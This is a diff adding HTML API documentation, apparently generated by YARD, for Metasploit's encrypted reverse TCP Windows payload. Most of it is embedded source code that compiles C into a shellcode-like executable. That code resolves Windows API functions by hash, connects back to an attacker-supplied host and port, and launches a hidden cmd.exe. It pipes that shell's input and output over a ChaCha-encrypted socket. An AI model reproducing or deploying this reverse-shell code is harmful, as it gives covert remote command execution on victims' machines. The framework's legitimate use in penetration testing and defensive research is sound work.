+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_comp_obj'>comp_obj</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Metasploit.html" title="Metasploit (module)">Metasploit</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework.html" title="Metasploit::Framework (module)">Framework</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler.html" title="Metasploit::Framework::Compiler (module)">Compiler</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw.html" title="Metasploit::Framework::Compiler::Mingw (module)">Mingw</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/X86.html" title="Metasploit::Framework::Compiler::Mingw::X86 (class)">X86</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/X86.html#initialize-instance_method" title="Metasploit::Framework::Compiler::Mingw::X86#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x64</span><span class='tstring_end'>&#39;</span></span>
+    <span class='id identifier rubyid_comp_obj'>comp_obj</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Metasploit.html" title="Metasploit (module)">Metasploit</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework.html" title="Metasploit::Framework (module)">Framework</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler.html" title="Metasploit::Framework::Compiler (module)">Compiler</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw.html" title="Metasploit::Framework::Compiler::Mingw (module)">Mingw</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/X64.html" title="Metasploit::Framework::Compiler::Mingw::X64 (class)">X64</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/X64.html#initialize-instance_method" title="Metasploit::Framework::Compiler::Mingw::X64#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_compiler_out'>compiler_out</span> <span class='op'>=</span> <span class='id identifier rubyid_comp_obj'>comp_obj</span><span class='period'>.</span><span class='id identifier rubyid_compile_c'>compile_c</span><span class='lparen'>(</span><span class='id identifier rubyid_src'>src</span><span class='rparen'>)</span>
+  <span class='kw'>unless</span> <span class='id identifier rubyid_compiler_out'>compiler_out</span><span class='period'>.</span><span class='id identifier rubyid_empty?'>empty?</span>
+    <span class='id identifier rubyid_elog'><span class='object_link'><a href="../../../top-level-namespace.html#elog-instance_method" title="#elog (method)">elog</a></span></span><span class='lparen'>(</span><span class='id identifier rubyid_compiler_out'>compiler_out</span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_raise'>raise</span> <span class='const'><span class='object_link'><a href="../../../Metasploit.html" title="Metasploit (module)">Metasploit</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework.html" title="Metasploit::Framework (module)">Framework</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler.html" title="Metasploit::Framework::Compiler (module)">Compiler</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw.html" title="Metasploit::Framework::Compiler::Mingw (module)">Mingw</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/UncompilablePayloadError.html" title="Metasploit::Framework::Compiler::Mingw::UncompilablePayloadError (class)">UncompilablePayloadError</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/UncompilablePayloadError.html#initialize-instance_method" title="Metasploit::Framework::Compiler::Mingw::UncompilablePayloadError#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Payload did not compile. Check the logs for further information.</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_comp_file'>comp_file</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:f_name</span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>.exe</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_raise'>raise</span> <span class='const'><span class='object_link'><a href="../../../Metasploit.html" title="Metasploit (module)">Metasploit</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework.html" title="Metasploit::Framework (module)">Framework</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler.html" title="Metasploit::Framework::Compiler (module)">Compiler</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw.html" title="Metasploit::Framework::Compiler::Mingw (module)">Mingw</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Metasploit/Framework/Compiler/Mingw/CompiledPayloadNotFoundError.html" title="Metasploit::Framework::Compiler::Mingw::CompiledPayloadNotFoundError (class)">CompiledPayloadNotFoundError</a></span></span> <span class='kw'>unless</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_exist?'>exist?</span><span class='lparen'>(</span><span class='id identifier rubyid_comp_file'>comp_file</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_bin'>bin</span> <span class='op'>=</span> <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_binread'>binread</span><span class='lparen'>(</span><span class='id identifier rubyid_comp_file'>comp_file</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_strip'>strip</span>
+  <span class='id identifier rubyid_bin'>bin</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>PeParsey</span><span class='op'>::</span><span class='const'>Pe</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>ImageSource</span><span class='op'>::</span><span class='const'>Memory</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_bin'>bin</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_text_section'>text_section</span> <span class='op'>=</span> <span class='id identifier rubyid_bin'>bin</span><span class='period'>.</span><span class='id identifier rubyid_sections'>sections</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span>
+  <span class='id identifier rubyid_text_section'>text_section</span> <span class='op'>=</span> <span class='id identifier rubyid_text_section'>text_section</span><span class='period'>.</span><span class='id identifier rubyid__isource'>_isource</span>
+
+  <span class='id identifier rubyid_comp_obj'>comp_obj</span><span class='period'>.</span><span class='id identifier rubyid_cleanup_files'>cleanup_files</span>
+  <span class='id identifier rubyid_text_section'>text_section</span><span class='period'>.</span><span class='id identifier rubyid_rawdata'>rawdata</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_hash-instance_method">
+  
+    #<strong>get_hash</strong>(lib, func)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+157
+158
+159</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 157</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='id identifier rubyid_lib'>lib</span><span class='comma'>,</span> <span class='id identifier rubyid_func'>func</span><span class='rparen'>)</span>
+  <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='id identifier rubyid_lib'>lib</span><span class='comma'>,</span> <span class='id identifier rubyid_func'>func</span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_load_library-instance_method">
+  
+    #<strong>get_load_library</strong>(host, port)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>ExecutePayload acts as the main function of the c program</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+467
+468
+469
+470
+471
+472
+473
+474
+475
+476
+477
+478
+479
+480
+481
+482
+483
+484
+485
+486
+487</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 467</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_load_library'>get_load_library</span><span class='lparen'>(</span><span class='id identifier rubyid_host'>host</span><span class='comma'>,</span> <span class='id identifier rubyid_port'>port</span><span class='rparen'>)</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    void ExecutePayload(VOID)
+    {
+      FuncLoadLibraryA LoadALibrary;
+      FuncWSASocketA WSASock;
+      FuncWSACleanup WSACleanup;
+      FuncConnect ConnectSock;
+      UINT proc_term_status = ExitProc();
+      SOCKET conn_socket = INVALID_SOCKET;
+      FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ExitProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;ExitProcess&#39;) -&gt; 0x56a2b5f0
+      FuncCloseHandle CloseHandle = (FuncCloseHandle) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CloseHandle</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;CloseHandle&#39;) -&gt; 0x528796c6
+
+      char ip[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_host'>host</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+      char port[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_port'>port</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+      char ws2[] = { &#39;w&#39;, &#39;s&#39;, &#39;2&#39;, &#39;_&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, 0 };
+
+      LoadALibrary = (FuncLoadLibraryA) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LoadLibraryA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;LoadLibrary&#39;) -&gt; 0x0726774C
+      LoadALibrary((LPTSTR) ws2);
+    </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_new_key-instance_method">
+  
+    #<strong>get_new_key</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 319</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_new_key'>get_new_key</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    char *get_new_key(SOCKET s)
+    {
+      FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;,
+      FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>recv</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+
+      char *received = VirtualAlloc(NULL, 45, MEM_COMMIT, PAGE_READWRITE);
+      int recv_num = RecvData(s, received, 44, 0);
+
+      received[44] = &#39;\\0&#39;;
+      return received;
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="headers-instance_method">
+  
+    #<strong>headers</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+201
+202
+203
+204
+205
+206
+207
+208
+209</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 201</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_headers'>headers</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    #include &quot;winsock_util.h&quot;
+    #include &quot;payload_util.h&quot;
+    #include &quot;kernel32_util.h&quot;
+
+    #include &quot;chacha.h&quot;
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="include_send_uuid-instance_method">
+  
+    #<strong>include_send_uuid</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+103
+104
+105</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 103</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+  <span class='kw'>true</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="init_proc-instance_method">
+  
+    #<strong>init_proc</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395
+396
+397
+398
+399
+400
+401
+402
+403
+404
+405
+406
+407
+408
+409
+410
+411
+412
+413
+414
+415
+416
+417
+418
+419
+420
+421
+422
+423
+424
+425
+426
+427
+428
+429
+430
+431
+432
+433
+434
+435
+436
+437
+438
+439
+440
+441
+442
+443
+444
+445
+446
+447
+448
+449
+450
+451
+452
+453
+454
+455
+456
+457
+458
+459
+460
+461
+462</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 335</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_init_proc'>init_proc</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    HANDLE* init_process(SOCKET s)
+    {
+      char cmd[] = { &#39;c&#39;, &#39;m&#39;, &#39;d&#39;, 0 };
+      STARTUPINFO si;
+      SECURITY_ATTRIBUTES sa;
+      PROCESS_INFORMATION pi;
+      UINT proc_stat = ExitProc();
+      HANDLE out_rd, out_wr, in_rd, in_wr;
+      FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ExitProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;ExitProcess&#39;) -&gt; 0x56a2b5f0
+
+      SecureZeroMemory(&amp;si, sizeof(si));
+      SecureZeroMemory(&amp;sa, sizeof(sa));
+      SecureZeroMemory(&amp;pi, sizeof(pi));
+
+      si.cb = sizeof(si);
+      sa.nLength = sizeof(sa);
+      sa.lpSecurityDescriptor = NULL;
+      sa.bInheritHandle = TRUE;
+
+      FuncCreatePipe CreatePipe = (FuncCreatePipe) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CreatePipe</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;CreatePipe&#39;) -&gt; 0xeafcf3e
+      CreatePipe(&amp;out_rd, &amp;out_wr, &amp;sa, 0);
+      CreatePipe(&amp;in_rd, &amp;in_wr, &amp;sa, 0);
+
+      FuncSetHandleInformation SetHandleInformation = (FuncSetHandleInformation) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SetHandleInformation</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;SetHandleInformation&#39;) -&gt; 0x1cd313ca
+      SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
+      SetHandleInformation(in_wr, HANDLE_FLAG_INHERIT, 0);
+
+      si.dwFlags = STARTF_USESTDHANDLES;
+      si.hStdError = si.hStdOutput = out_wr;
+      si.hStdInput = in_rd;
+
+      FuncCreateProcess CreateProcess = (FuncCreateProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CreateProcessA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;CreateProcess&#39;) -&gt; 0x863fcc79
+      if(!CreateProcess(NULL, cmd, &amp;sa, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi))
+      {
+        ExitProcess(proc_stat);
+      }
+
+      FuncCloseHandle CloseHandle = (FuncCloseHandle) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CloseHandle</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;CloseHandle&#39;) -&gt; 0x528796c6
+      CloseHandle(pi.hProcess);
+      CloseHandle(pi.hThread);
+
+      FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GlobalAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;GlobalAlloc&#39;) -&gt; 0x520f76f6
+      HANDLE *handle_arr = GlobalAlloc(GMEM_FIXED, sizeof(HANDLE) * 2);
+
+      handle_arr[0] = out_rd;
+      handle_arr[1] = in_wr;
+
+      return handle_arr;
+    }
+
+    void communicate(HANDLE out, HANDLE in, SOCKET s)
+    {
+      DWORD data = 0;
+      char buf[512];
+      int buf_size = 512;
+      int new_key = 0;
+      DWORD bytes_received = 0;
+      FuncSleep Sleep = (FuncSleep) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Sleep</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;Sleep&#39;) -&gt; 0xe035f044
+      FuncSend SendData = (FuncSend) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>send</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;send&#39;) -&gt; 0x5f38ebc2
+      FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>recv</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;recv&#39;) -&gt; 0x5fc8d902
+      FuncReadFile ReadFile = (FuncReadFile) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ReadFile</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;ReadFile&#39;) -&gt; 0xbb5f9ead
+      FuncWriteFile WriteFile = (FuncWriteFile) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WriteFile</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;WriteFile&#39;) -&gt; 0x5bae572d
+      FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ExitProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;ExitProcess&#39;) -&gt; 0x56a2b5f0
+      FuncPeekNamedPipe PeekNamedPipe = (FuncPeekNamedPipe) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PeekNamedPipe</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;PeekNamedPipe&#39;) -&gt; 0xb33cb718
+      FuncVirtualFree VirtualFree = (FuncVirtualFree) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualFree</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;VirtualFree&#39;) -&gt; 0x300f2f0b
+
+      SecureZeroMemory(buf, buf_size);
+      UINT term_stat = ExitProc();
+      char init_key[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaKey</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+      char init_nonce[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaNonce</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+      char *key = init_key;
+      char *nonce = init_nonce;
+
